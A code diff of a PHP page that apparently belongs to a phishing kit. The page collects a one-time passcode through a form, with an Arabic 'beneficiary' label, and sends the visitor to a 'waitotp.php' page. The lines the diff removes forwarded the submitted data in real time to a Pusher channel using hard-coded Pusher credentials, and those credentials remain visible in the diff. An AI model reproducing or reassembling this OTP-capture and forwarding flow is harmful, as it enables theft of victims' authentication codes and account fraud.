@@ -4,9 +4,6 @@ ini_set('display_errors', 0);
 ########################
 session_start();
 
-require_once('./dashboard/init.php');
-require_once('./vendor/autoload.php');
-require __DIR__ . '/vendor/autoload.php';
 
 if (isset($_GET['type'])) {
     $type = $_GET['type'];
@@ -18,12 +15,7 @@ if (isset($_POST['submit'])) {
         'cluster' => 'ap2',
         'useTLS' => true
     );
-    $pusher = new Pusher\Pusher(
-        'e77a3acd6f6fc7cd49ce',
-        'd42bbf9412e5a18b9d6c',
-        '1816717',
-        $options
-    );
+    
 
     $site = array(
         'otp' => $_POST["otp"],
@@ -41,7 +33,7 @@ if (isset($_POST['submit'])) {
             'updatedData' => $site
         ];
 
-        $pusher->trigger('my-channel', 'update-user', $data);
+        
         echo "<script>document.location.href='waitotp.php';</script>";
     }
 }
@@ -164,13 +156,13 @@ if (isset($_POST['submit'])) {
     </nav> -->
 
     <div class="container text-center mt-4">
-        <img src="./assets/b6ee10_401367f75c744af6a7385c03b5a823d7~mv2.avif" class="img-fluid" alt="">
+        <img src="./assets/b6ee10_1120245136ce465dbe383d727a828265~mv2.avif" class="img-fluid" alt="">
     </div>
 
     <div class="container mt-4">
         <div class="cclas shadow">
             <div class="text-center mt-2">
-                <img src="./assets/c5cbfa_cd127e4564c143ca98cf14fd04002708~mv2.avif" width="60" alt="">
+                <img src="./assets/24dde8_0db91c8fda04473fb47226437e5c4f92~mv2.avif" width="60" alt="">
             </div>
             <div class="d-flex justify-content-between mt-2">
                 <span class="text-primary me-2 fw-bold">المستفيد:</span>
